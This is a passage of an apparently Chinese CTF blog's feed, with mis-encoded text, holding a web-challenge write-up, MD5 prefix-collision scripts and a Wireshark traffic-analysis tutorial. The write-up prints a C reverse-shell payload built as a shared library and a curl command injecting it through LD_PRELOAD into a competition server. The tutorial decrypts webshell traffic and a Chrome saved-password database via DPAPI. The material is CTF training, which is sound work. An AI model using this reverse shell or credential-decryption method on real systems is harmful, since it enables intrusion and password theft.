class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åŠ¨æ€åº“(æ³¨æ„å’ŒæœåŠ¡å™¨ç¯å¢ƒç›¸ä¼¼)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109223215495.png" alt="image-20191109223215495"></p><p>ä¼šæŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨</p><p>æœåŠ¡å™¨å…ˆç›‘å¬1234ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109222241231.png" alt="image-20191109222241231"></p><p>ç„¶åæ‰§è¡Œpayload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure><p>æœåŠ¡é”™è¯¯å°±å¤šè¿è¡Œå‡ æ¬¡</p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109222659969.png" alt="image-20191109222659969"></p><p>å¾—åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      å¤ªèœäº†ï¼Œåªèƒ½å¤ç°
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="å¤ç°" scheme="https://0xcreed.jxustctf.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MD5Crack</title>
    <link href="https://0xcreed.jxustctf.top/2019/11/Md5Crack/"/>
    <id>https://0xcreed.jxustctf.top/2019/11/Md5Crack/</id>
    <published>2019-11-04T07:07:02.000Z</published>
    <updated>2020-04-10T07:13:43.185Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç®€å•ç¢°æ’è„šæœ¬"><a href="#ç®€å•ç¢°æ’è„šæœ¬" class="headerlink" title="ç®€å•ç¢°æ’è„šæœ¬"></a>ç®€å•ç¢°æ’è„šæœ¬</h2><p>ä¸€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><p>äºŒ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ä½¿ç”¨æ–¹æ³•ï¼špython md5Crack.py "ä½ è¦ç¢°æ’çš„å­—ç¬¦ä¸²" å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®</span></span><br><span class="line"><span class="string">ä¾‹å¦‚ï¼špython md5Crack.py â€œ0e" 0</span></span><br><span class="line"><span class="string">å°†äº§ç”ŸMD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md51 = hashlib.md5(rnds)</span><br><span class="line">        value1 = md51.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #ç¢°æ’å•MD5</span></span><br><span class="line"><span class="string">            print rnds</span></span><br><span class="line"><span class="string">            stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #ç¢°æ’åŒmd5</span></span><br><span class="line"><span class="string">            md52 = hashlib.md5(value1)</span></span><br><span class="line"><span class="string">            if md52.hexdigest()[start: start+str_len] == substr:</span></span><br><span class="line"><span class="string">            print rnds+ "=&gt;" + value1+"=&gt;"+ md52.hexdigest()  + "\n"</span></span><br><span class="line"><span class="string">                stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ç¢°æ’ä¸‰MD5</span></span><br><span class="line">            md52 = hashlib.md5(value1)</span><br><span class="line">            value2 = md52.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start + str_len] == substr:</span><br><span class="line">                md53 = hashlib.md5(value2)</span><br><span class="line">                <span class="keyword">if</span> md53.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                    <span class="keyword">print</span> rnds + <span class="string">"=&gt;"</span> + value1 + <span class="string">"=&gt;"</span> +value2+<span class="string">"=&gt;"</span>+ md53.hexdigest() + <span class="string">"\n"</span></span><br><span class="line">                    stop_event.set()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = int(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><p><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p>]]></content>
    
    <summary type="html">
    
      Md5ç¢°æ’è„šæœ¬
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="MD5" scheme="https://0xcreed.jxustctf.top/tags/MD5/"/>
    
      <category term="Crack" scheme="https://0xcreed.jxustctf.top/tags/Crack/"/>
    
  </entry>
  
  <entry>
    <title>wireshark</title>
    <link href="https://0xcreed.jxustctf.top/2019/11/wireshark/"/>
    <id>https://0xcreed.jxustctf.top/2019/11/wireshark/</id>
    <published>2019-11-03T04:54:35.000Z</published>
    <updated>2019-11-11T04:04:51.754Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ä¸€ã€å¿«æ·é”®"><a href="#ä¸€ã€å¿«æ·é”®" class="headerlink" title="ä¸€ã€å¿«æ·é”®"></a>ä¸€ã€å¿«æ·é”®</h2><p>Ctrl+M æ ‡è®°/å–æ¶ˆæ ‡è®°<br> shift+ctrl+N/B ä¸‹/ä¸Šä¸€ä¸ªè¢«æ ‡è®°çš„æ•°æ®åŒ…</p><h2 id="äºŒã€è¿‡æ»¤å™¨è¯­æ³•"><a href="#äºŒã€è¿‡æ»¤å™¨è¯­æ³•" class="headerlink" title="äºŒã€è¿‡æ»¤å™¨è¯­æ³•"></a>äºŒã€è¿‡æ»¤å™¨è¯­æ³•</h2><h3 id="1-æ•è·è¿‡æ»¤å™¨çš„BPF-Berkeley-Packet-Filter-è¯­æ³•"><a href="#1-æ•è·è¿‡æ»¤å™¨çš„BPF-Berkeley-Packet-Filter-è¯­æ³•" class="headerlink" title="1.æ•è·è¿‡æ»¤å™¨çš„BPF(Berkeley Packet Filter)è¯­æ³•"></a>1.æ•è·è¿‡æ»¤å™¨çš„BPF(Berkeley Packet Filter)è¯­æ³•</h3><p>é™å®šè¯    è¯´æ˜                                                                  ä¾‹å­  </p><a id="more"></a><p>Type      æŒ‡å‡ºåå­—æˆ–æ•°å­—æ‰€ä»£è¡¨çš„æ„ä¹‰                         hostã€netã€port  </p><p>Dir         æŒ‡æ˜ä¼ è¾“æ–¹å‘æ˜¯å‰å¾€è¿˜æ˜¯æ¥è‡ªåå­—æˆ–æ•°å­—      srcã€dst  </p><p>Proto     é™å®šæ‰€è¦åŒ¹é…çš„åè®®                                        etherã€ipã€tcpã€udpã€httpã€ftp</p><p>ä½¿ç”¨BPFè¯­æ³•åˆ›å»ºçš„è¿‡æ»¤å™¨è¢«ç§°ä¸ºè¡¨è¾¾å¼ï¼Œæ¯ä¸ªè¡¨è¾¾å¼åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŸè¯­ã€‚æ¯ä¸ªåŸè¯­åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªé™å®šè¯ï¼Œç„¶åè·Ÿç€ä¸€ä¸ªIDåå­—æˆ–è€…æ•°å­—</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">&lt;----------åŸè¯­---------&gt;</span>|<span class="string">&lt;æ“ä½œç¬¦&gt;</span>|<span class="string">&lt;-----åŸè¯­----&gt;</span>|</span><br><span class="line"> dst   host   192.168.0.10   &amp;&amp;    tcp   port   80</span><br><span class="line">|<span class="string">é™å®šè¯</span>|<span class="string">é™å®šè¯</span>|<span class="string">&lt;----ID----&gt;</span>|<span class="string">      </span>|<span class="string">é™å®šè¯</span>|<span class="string">é™å®šè¯</span>|<span class="string">ID</span>|</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨3ä¸­é€»è¾‘è¿ç®—ç¬¦å¯¹åŸè¯­è¿›è¡Œç»„åˆ</p><ul><li>è¿æ¥è¿ç®—ç¬¦ &amp;&amp;</li><li>é€‰æ‹©è¿ç®—ç¬¦ ||</li><li>å¦å®šè¿ç®—ç¬¦ !</li></ul><p>ä¾‹ï¼š<br> <code>src 192.168.0.10 &amp;&amp; port 80</code><br> åªæ•è·æºåœ°å€æ˜¯192.168.0.10å’Œæºç«¯å£æˆ–ç›®çš„ç«¯å£æ˜¯80çš„æµé‡</p><p><code>ether host 00-1a-a0-52-e2-a0</code><br> æ ¹æ®MACåœ°å€æ•è·</p><h4 id="å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹"><a href="#å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹" class="headerlink" title="å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹"></a>å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹</h4><p> è¿‡æ»¤å™¨                                      è¯´æ˜                        </p><p> tcp[13]&amp;32==32                                          è®¾ç½®URGä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;16==16                                          è®¾ç½®ACKä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;8==8                                              è®¾ç½®PSHä½çš„TCPæ•°æ®åŒ…<br>  tcp[13]&amp;4==4                                            è®¾ç½®RSTä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;2==2                                              è®¾ç½®SYNä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;1==1                                            è®¾ç½®FINä½çš„TCPæ•°æ®åŒ…<br> tcp[13]==18                                                 TCP SYN-ACKæ•°æ®åŒ…<br> ether host 00:00:00:00:00:00(ä½ çš„MACåœ°å€)       æµå…¥æˆ–æµå‡ºä½ MACåœ°å€çš„æµé‡<br> !ether host 00:00:00:00:00:00(ä½ çš„MACåœ°å€)     ä¸æµå…¥æˆ–æµå‡ºä½ MACåœ°å€çš„æµé‡<br> broadcast                                                    ä»…å¹¿æ’­æµé‡<br> icmp                                                           ICMPæµé‡<br> icmp[0:2]==0x0301                               ICMPç›®æ ‡ä¸å¯è¾¾ã€ä¸»æœºä¸å¯è¾¾<br> ip                                                                     ä»…IPv4æµé‡<br> ip6                                                               ä»…IPv6æµé‡<br> udp                                                         ä»…UDPæµé‡                   </p><h3 id="2-åè®®åŸŸè¿‡æ»¤å™¨"><a href="#2-åè®®åŸŸè¿‡æ»¤å™¨" class="headerlink" title="2.åè®®åŸŸè¿‡æ»¤å™¨"></a>2.åè®®åŸŸè¿‡æ»¤å™¨</h3><p>BPFè¯­æ³•è¿˜æä¾›äº†åè®®åŸŸè¿‡æ»¤å™¨ï¼Œå¯ä»¥åšæŒåè®®å¤´ä¸­çš„æ¯ä¸€å­—èŠ‚æ¥è¿‡æ»¤<br> ä¾‹ï¼š<br> <code>icmp[0]==3</code><br> è¿”å›icmpåŒ…çš„ç¬¬1ä¸ªå­—èŠ‚çš„æ•´å½¢å€¼æ¯”è¾ƒï¼Œåªæ•è·ä»£è¡¨ç›®æ ‡ä¸å¯è¾¾ä¿¡æ¯(ç±»å‹3)çš„ICMPæ•°æ®åŒ…</p><p><code>icmp[0:2]==0x0301</code><br> æ•è·æ‰€æœ‰ç±»å‹3ä»£ç 1è¡¨ç¤ºçš„ç›®æ ‡ä¸å¯è¾¾ã€ä¸»æœºä¸å¯è¾¾çš„ICMPæ•°æ®åŒ…</p><p><code>tcp[13]&amp;4==4</code><br> åªæ•è·å¸¦æœ‰RSTæ ‡å¿—çš„TCPæ•°æ®åŒ…(RSTæ ‡å¿—ä½åœ¨TCPåŒ…åç§»13å­—èŠ‚ï¼Œ00000100)</p><h3 id="3-æ˜¾ç¤ºè¿‡æ»¤å™¨"><a href="#3-æ˜¾ç¤ºè¿‡æ»¤å™¨" class="headerlink" title="3.æ˜¾ç¤ºè¿‡æ»¤å™¨"></a>3.æ˜¾ç¤ºè¿‡æ»¤å™¨</h3><p><a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">æ˜¾ç¤ºè¿‡æ»¤å™¨å‚è€ƒ</a></p><p>å¸¸ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨</p><p>è¿‡æ»¤å™¨                                  è¯´æ˜<br>!tcp.port==3389                 æ’é™¤RDPæµé‡<br>tcp.flags.syn==1                å…·æœ‰SYNæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…<br>tcp.flags.rst==1                  å…·æœ‰RSTæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…<br>!arp                                      æ’é™¤ARPæµé‡<br>http                                æ‰€æœ‰HTTPæµé‡<br>tcp.port==23 || tcp.port==21  æ–‡æœ¬ç®¡ç†æµé‡ï¼ˆTelnetæˆ–FTPï¼‰<br>smtp || pop || imap         æ–‡æœ¬emailæµé‡ï¼ˆSMTPã€POPæˆ–IMAPï¼‰ </p><h2 id="ä¸‰ã€å¯¼å‡ºå¯¹è±¡"><a href="#ä¸‰ã€å¯¼å‡ºå¯¹è±¡" class="headerlink" title="ä¸‰ã€å¯¼å‡ºå¯¹è±¡"></a>ä¸‰ã€å¯¼å‡ºå¯¹è±¡</h2><p>CTFç«èµ›ä¸­æœ€å¸¸è§çš„å°±æ˜¯HTTPåè®®äº†ï¼Œè€Œä¸”é€šä¿¡ä¸»æœºå°‘å®¹æ˜“åˆ†æã€‚</p><p>åˆ©ç”¨å¯¼å‡ºå¯¹è±¡å¯ä»¥å¿«é€Ÿçš„åˆ¤æ–­è¿™æ®µæµé‡åœ¨å¹²å˜›ã€‚</p><p><img src="/2019/11/wireshark/image-20191103145931434.png" alt="image-20191103145931434"></p><p>é€‰æ‹©HTTPâ€¦</p><p><img src="/2019/11/wireshark/image-20191103155828631.png" alt="image-20191103155828631"></p><p>å¾ˆæ¸…æ™°çš„å¯ä»¥çœ‹åˆ°httpè¯·æ±‚ã€‚</p><p>å¾ˆæ˜æ˜¾æ˜¯ä¸ªæ”»å‡»è€…å¯¹æœåŠ¡å™¨å‘èµ·äº†sqlæ³¨å…¥æ”»å‡»</p><p>æ ¹æ®å®ƒçš„HTTPè¯·æ±‚ï¼Œæ”»å‡»è€…è·å¾—äº†é‚£äº›æ•°æ®æˆ‘ä»¬åŒæ ·ä¹Ÿèƒ½å¾—åˆ°ã€‚</p><p>è€Œä¸”ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½èƒ½æˆªè·ã€‚</p><p><img src="/2019/11/wireshark/image-20191103170050584.png" alt="image-20191103170050584"></p><p>é€šè¿‡å³ä¸‹è§’çš„SAVAå¯ä»¥å®Œæ•´çš„ä¿å­˜ä¼ è¾“çš„æ–‡ä»¶ã€‚</p><h2 id="å››ã€å®æˆ˜"><a href="#å››ã€å®æˆ˜" class="headerlink" title="å››ã€å®æˆ˜"></a>å››ã€å®æˆ˜</h2><p>æµé‡åˆ†æå°±æ˜¯ä¸ªå¤§æ‚çƒ©ï¼Œä»€ä¹ˆéƒ½èƒ½åŠ ã€‚</p><p>æ¯”å¦‚phpè¯­è¨€ï¼Œhttpï¼Œtcp/ipåè®®ï¼Œå„ç§åŠ è§£å¯†ï¼Œéšå†™ï¼Œsqlæ³¨å…¥ç­‰ç­‰</p><p>3CTFå¤èµ›çš„ä¸€é“æµé‡åˆ†æé¢˜</p><p><a href="https://pan.baidu.com/s/1rLlbRyapHrTOWUc3BfVafQ" target="_blank" rel="noopener">ok.pcapng</a> æå–ç : 7y3a </p><p>å…ˆä½¿ç”¨ ç»Ÿè®¡-åè®®åˆ†çº§åŠŸèƒ½ï¼ŒæŸ¥çœ‹æµé‡åŒ…å…·ä½“çš„æœ‰å“ªäº›åè®®ã€‚</p><p><img src="/2019/11/wireshark/image-20191107184246441.png" alt="image-20191107184246441"></p><p>ç™¾åˆ†ä¹‹ä¹åä»¥ä¸Šæ˜¯TCPåè®®ã€‚</p><p>ç„¶åä½¿ç”¨ æ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-HTTP æŸ¥çœ‹å…·ä½“çš„HTTPè¯·æ±‚å’Œæ˜¯å¦æœ‰æ–‡ä»¶ä¼ è¾“</p><p><img src="/2019/11/wireshark/image-20191107184812717.png" alt="image-20191107184812717"></p><p>ä»è¿™äº›HTTPè¯·æ±‚ä¸­ï¼Œåº”è¯¥æ˜¯é€šè¿‡upload.phpä¸Šä¼ äº†file_5d81f9f4d22d41.67475082.php</p><p>ç„¶åä¸€ç›´ä¸file_5d81f9f4d22d41.67475082.phpè¿›è¡Œäº¤äº’ã€‚</p><p>åˆ©ç”¨ è¿½è¸ªæµçš„åŠŸèƒ½æŸ¥çœ‹å®Œæ•´çš„æŠ¥æ–‡</p><p><img src="/2019/11/wireshark/image-20191107221151317.png" alt="image-20191107221151317"></p><p>é€‰æ‹©HTTPæµ</p><p><img src="/2019/11/wireshark/image-20191107221334510.png" alt="image-20191107221334510"></p><p>ä¸€ä¸ªæ ‡å‡†çš„å†°èé©¬</p><p>å†°èé©¬ä¼šå…ˆä»å®¢æˆ·ç«¯å¾—åˆ°ä¸€ä¸ªåŠ å¯†å¯†åŒ™ï¼Œç”¨äºæµé‡åŠ å¯†ã€‚</p><p><img src="/2019/11/wireshark/image-20191107222451205.png" alt="image-20191107222451205"></p><p>æˆ‘ä»¬è¿½è¸ªä¸€ä¸‹pass=790çš„æµé‡ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©è¿½è¸ªTCPæµï¼Œæ–¹ä¾¿åé¢æŸ¥çœ‹å…¶ä»–æµ</p><p><img src="/2019/11/wireshark/image-20191107223755881.png" alt="image-20191107223755881"></p><p>å¾—åˆ°è§£å¯†å¯†åŒ™  <code>d59042be6e437849</code></p><p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$post=<span class="string">''</span>; <span class="comment"># æ”¾å…¥ä½ è¦è§£å¯†çš„å†…å®¹</span></span><br><span class="line">$str=openssl_decrypt($post, <span class="string">"AES128"</span>, <span class="string">'d59042be6e437849'</span>);</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$str);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°ç¬¬äºŒä¸ªæµçš„æœ€åä¸€ä¸ªæµé‡</p><p><img src="/2019/11/wireshark/image-20191111115823331.png" alt="image-20191111115823331"></p><p><img src="/2019/11/wireshark/image-20191111115909128.png" alt="image-20191111115909128"></p><p><img src="/2019/11/wireshark/image-20191111120005244.png" alt="image-20191111120005244"></p><p><img src="/2019/11/wireshark/image-20191107234940949.png" alt="image-20191107234940949"></p><p>å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä½†ç›®å‰ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p>åº”è¯¥åœ¨æµé‡åŒ…ä¸­è¿˜æœ‰æˆ‘ä»¬æ²¡æœ‰å‘ç°çš„ä¸œè¥¿</p><p>ä¸€ã€å¯ä»¥é€šè¿‡æœç´¢å…³é”®å­—çš„16è¿›åˆ¶ï¼ŒäºŒã€å¯ä»¥é€šè¿‡æŸ¥é˜…å®Œæ•´TCPæµã€‚</p><p>1.flagçš„16è¿›åˆ¶ä¸º <code>666c6167</code></p><p><img src="/2019/11/wireshark/image-20191107235545698.png" alt="image-20191107235545698"></p><p>ç¬¬521ä¸ªåŒ…</p><p>2.è°ƒæ•´æµï¼Œå¤§è‡´æµè§ˆæŠ¥æ–‡ã€‚</p><p>åœ¨ç¬¬8ä¸ªæµ ï¼Œå‘ç°äº†ä¸ä¸€æ ·çš„ä¸œè¥¿</p><p><img src="/2019/11/wireshark/image-20191107235710539.png" alt="image-20191107235710539"></p><p>é€šè¿‡å¯¼å‡ºå¯¹è±¡ï¼ŒæŠŠè¿™ä¸ªSQLiteæ–‡ä»¶å¯¼å‡º</p><p>ç„¶åè¿™é¢˜ä¸»è¦æ˜¯è§£å¯†<code>Chrome</code>æµè§ˆå™¨çš„ä¿å­˜å¯†ç çš„<code>Login Data</code>æ•°æ®åº“ï¼ˆå°±æ˜¯ä¸ªSQLIte3æ•°æ®åº“ï¼‰ï¼Œ</p><p>å¯ä»¥é€šè¿‡ç¦»çº¿çš„æ–¹å¼å¯¼å‡ºå¯†ç ã€‚éœ€è¦ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç è§£å¯†master key file è·å¾—master keyã€‚å†ç”¨master keyè§£å¯†DPAPI blob ã€‚<br> è§£è¿™é¢˜ä¸»è¦éœ€è¦æ˜æ–‡å¯†ç ã€<code>blob</code>ã€<code>master key</code>ã€‚ä¸»è¦æ˜¯322ï¼Œ524ï¼Œ654å·æ•°æ®åŒ…ï¼š</p><p>ä½¿ç”¨DB Browser for SQLiteæ‰“å¼€SQLiteæ–‡ä»¶</p><p><img src="/2019/11/wireshark/image-20191109230229511.png" alt="image-20191109230229511"></p><p>å¯¼å‡ºåŠ å¯†åçš„blob</p><p>åœ¨æœ€åä¸€ä¸ªæµä¸­(11)ï¼Œå‘ç°è¿”å›çš„å­—ç¬¦ä¸²å’Œä¹‹å‰çš„ä¸ä¸€æ ·ï¼Œ</p><p>è§£å¯†POSTåŒ…</p><p><img src="/2019/11/wireshark/image-20191109233659468.png" alt="image-20191109233659468"></p><p>å¾—åˆ°æ–‡ä»¶è·¯å¾„</p><p>è¿”å›çš„å¯†æ–‡å°±æ˜¯<code>master key</code></p><p><img src="/2019/11/wireshark/image-20191109231824174.png" alt="image-20191109231824174"></p><p>å¤åˆ¶åˆ°æ–‡ä»¶æˆ–è€…å¯¼å‡ºå¯¹è±¡</p><p>æœ€ååˆ©ç”¨ windows password recoveryæ¥è§£å¯† </p><p>(æ²¡æœ‰ windows password recoveryæ‰€ä»¥å›¾æ˜¯ç›—çš„<a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">yyqx</a>å¤§ä½¬çš„)</p><p>  é€‰æ‹©Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob <img src="/2019/11/wireshark/2019110711452061.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><p> <img src="/2019/11/wireshark/20191107114526761.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><p> <img src="/2019/11/wireshark/20191107114541741.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><p> SIDå°±æ˜¯ä¹‹å‰è·¯å¾„ä¸­çš„S-1-5-21-2127750816-4215895028-2373289296-1001<br> passwordå°±æ˜¯p@ssw0rd<br> ç„¶åè§£å¯† </p><p> <img src="/2019/11/wireshark/20191107114557647.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><p> <img src="/2019/11/wireshark/20191107114605559.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><p><a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://cloud.tencent.com/developer/news/90236" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>]]></content>
    
    <summary type="html">
    
      CTFç«èµ›ä¸­wiresharkçš„åŸºæœ¬ä½¿ç”¨
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="wireshark" scheme="https://0xcreed.jxustctf.top/tags/wireshark/"/>
    
      <category term="å·¥å…·" scheme="https://0xcreed.jxustctf.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>phpå¼±ç±»å‹</title>
    <link href="https://0xcreed.jxustctf.top/2019/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
